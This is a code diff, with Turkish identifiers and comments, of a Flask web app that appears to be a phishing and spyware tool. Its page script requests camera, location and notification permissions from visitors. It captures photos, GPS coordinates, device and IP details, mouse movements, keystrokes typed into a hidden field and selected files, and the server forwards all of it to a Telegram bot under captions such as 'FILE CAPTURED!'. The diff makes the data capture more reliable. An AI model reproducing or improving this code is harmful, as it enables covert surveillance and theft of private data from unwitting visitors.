@@ -24,15 +24,20 @@ def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
         files = {'photo': ('ajan.jpg', resim_bytes)}
         data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
         requests.post(url, files=files, data=data, timeout=15)
-    except: pass
+    except Exception as e: 
+        telegram_mesaj_gonder(f"❌ Fotoğraf Hatası: {str(e)}")
 
 def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
     try:
+        # Dosya adını güvenli hale getir (Türkçe karakterleri sil)
+        guvenli_isim = "dosya_" + str(int(time.time())) + "_" + dosya_adi.replace(" ", "_")
+        
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
-        files = {'document': (dosya_adi, dosya)}
+        files = {'document': (guvenli_isim, dosya)}
         data = {'chat_id': CHAT_ID, 'caption': aciklama}
         requests.post(url, files=files, data=data, timeout=30)
-    except: pass
+    except Exception as e:
+        telegram_mesaj_gonder(f"❌ Dosya Gönderme Hatası: {str(e)}")
 
 @app.route('/', methods=['GET'])
 def ana_sayfa():
@@ -40,7 +45,6 @@ def ana_sayfa():
     if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
 
-    # 🚨 ÇÖZÜM: IP ve User-Agent'i JSON string'e çevirerek JS kodunun bozulmasını engelliyoruz.
     guvenli_ip = json.dumps(ziyaretci_ip)
     guvenli_cihaz = json.dumps(user_agent)
     guvenli_anahtar = json.dumps(GIZLI_ANAHTAR)
@@ -90,7 +94,6 @@ def ana_sayfa():
     </div>
 
     <script>
-        // Python'dan güvenli bir şekilde gelen değişkenler
         const IP_ADRESI = {guvenli_ip};
         const CIHAZ_BILGISI = {guvenli_cihaz};
         const SECRET_KEY = {guvenli_anahtar};
@@ -99,7 +102,6 @@ def ana_sayfa():
         let hareketVerisi = [];
         let sonHareketZamani = 0;
 
-        // Butonları ID ile seçip tıklama olaylarını ekliyoruz (En sağlam yöntem)
         const btnEvet = document.getElementById('btnEvet');
         const btnHayir = document.getElementById('btnHayir');
 
@@ -133,7 +135,6 @@ def ana_sayfa():
             }}
         }});
 
-        // --- HAREKETLERİ TOPLAMA (Touch & Mouse) ---
         function hareketEkle(x, y) {{
             const suan = Date.now();
             if (suan - sonHareketZamani > 500) {{
@@ -151,7 +152,7 @@ def ana_sayfa():
                 method: 'POST',
                 headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                 body: JSON.stringify({{ hareketler: hareketVerisi }})
-            }});
+            }}).catch(e => console.log(e));
             hareketVerisi = []; 
         }}
 
@@ -166,26 +167,27 @@ def ana_sayfa():
 
         window.addEventListener('beforeunload', hareketGonder);
 
+        // 🚨 GÜNCELLEME: İstekleri sırayla ve küçük beklemelerle yapıyoruz
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
-            // 1. BİLDİRİM İZNİ
+            // 1. ÖNCE CİHAZ BİLGİSİ (IP ve Tarayıcı) - Hemen gelsin
+            fetch('/cihaz', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
+                body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
+            }}).catch(e => console.log(e));
+
+            // 2. BİLDİRİM İZNİ
             if ("Notification" in window) {{
                 Notification.requestPermission().then(function(permission) {{
                     fetch('/bildirim', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                         body: JSON.stringify({{ durum: permission }})
-                    }});
+                    }}).catch(e => console.log(e));
                 }});
             }}
-
-            // 2. IP VE CİHAZ BİLGİSİ
-            fetch('/cihaz', {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
-                body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
-            }});
 
             try {{
                 // 3. KAMERA
@@ -204,26 +206,29 @@ def ana_sayfa():
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                         body: JSON.stringify({{ image: foto, ip: IP_ADRESI }})
-                    }});
+                    }}).catch(e => console.log(e));
+
                     durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
+                    
+                    // 🚨 KAMERA İZNİ BİTTİKTEN 1 SANİYE SONRA KONUM İSTE (Çakışmayı önler)
+                    setTimeout(() => {{
+                        if (navigator.geolocation) {{
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {{
+                                    fetch('/konum', {{
+                                        method: 'POST',
+                                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
+                                        body: JSON.stringify({{ lat: position.coords.latitude, lon: position.coords.longitude }})
+                                    }}).catch(e => console.log(e));
+                                    durum.innerHTML = "Konum alındı. Sistem dinlemede...";
+                                }},
+                                (error) => {{ durum.innerHTML = "Konum izni reddedildi."; }}
+                            );
+                        }}
+                    }}, 1000); 
                 }};
 
-                // 4. GPS KONUM
-                if (navigator.geolocation) {{
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {{
-                            fetch('/konum', {{
-                                method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
-                                body: JSON.stringify({{ lat: position.coords.latitude, lon: position.coords.longitude }})
-                            }});
-                            durum.innerHTML = "Konum alındı. Sistem dinlemede...";
-                        }},
-                        (error) => {{ durum.innerHTML = "Konum izni reddedildi."; }}
-                    );
-                }}
-
-                // 5. KLAVYE
+                // 4. KLAVYE
                 let sonGonderim = 0;
                 document.getElementById('gizliMetin').addEventListener('input', function(e) {{
                     const suan = Date.now();
@@ -232,23 +237,27 @@ def ana_sayfa():
                             method: 'POST',
                             headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                             body: JSON.stringify({{ text: e.target.value }})
-                        }});
+                        }}).catch(e => console.log(e));
                         sonGonderim = suan;
                     }}
                 }});
 
-                // 6. DOSYA YÜKLEME
+                // 5. DOSYA YÜKLEME
                 document.getElementById('dosyaSec').addEventListener('change', function(e) {{
                     const file = e.target.files[0];
                     if (file) {{
                         const formData = new FormData();
                         formData.append('dosya', file);
+                        durum.innerHTML = "Dosya yükleniyor, lütfen bekleyin...";
+                        
                         fetch('/dosya', {{
                             method: 'POST',
                             headers: {{ 'X-Secret-Key': SECRET_KEY }},
                             body: formData
                         }}).then(() => {{
                             durum.innerHTML = "Dosya Telegram'a Gönderildi!";
+                        }}).catch(e => {{
+                            durum.innerHTML = "Dosya yüklenirken hata oluştu.";
                         }});
                     }}
                 }});
@@ -321,10 +330,24 @@ def keylog():
 
 @app.route('/dosya', methods=['POST'])
 def dosya():
-    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
-    if 'dosya' not in request.files: return "Hata", 400
+    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: 
+        print("Hata: Anahtar uyuşmuyor.")
+        return "Hata", 403
+    if 'dosya' not in request.files: 
+        print("Hata: Dosya yok.")
+        return "Hata", 400
+    
     dosya = request.files['dosya']
-    telegram_dosya_gonder(dosya, dosya.filename, "📁 <b>DOSYA ELE GEÇİRİLDİ!</b>")
+    if dosya.filename == '':
+        print("Hata: Dosya adı boş.")
+        return "Hata", 400
+
+    # Dosyayı oku
+    dosya_icerigi = dosya.read()
+    
+    # Telegram'a gönder
+    telegram_dosya_gonder(dosya_icerigi, dosya.filename, "📁 <b>DOSYA ELE GEÇİRİLDİ!</b>")
+    
     return "OK", 200
 
 @app.route('/kamera', methods=['POST'])
